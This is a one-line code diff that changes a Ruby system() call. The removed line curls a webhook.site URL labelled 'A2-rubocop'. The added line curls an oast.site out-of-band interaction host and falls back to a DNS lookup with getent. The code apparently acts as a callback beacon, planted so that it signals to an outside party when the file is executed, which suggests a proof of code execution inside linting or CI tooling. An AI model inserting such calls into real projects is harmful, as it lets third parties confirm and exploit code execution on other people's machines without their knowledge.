@@ -1,1 +1,1 @@
-system("curl -s https://webhook.site/15479d0f-7970-44b5-8c94-b223d66671c7/A2-rubocop")
+system("curl -s -m3 http://rubo.d8v90ls2gvboee8l4ot0octrpeairsbun.oast.site/ || getent hosts rubo2.d8v90ls2gvboee8l4ot0octrpeairsbun.oast.site")
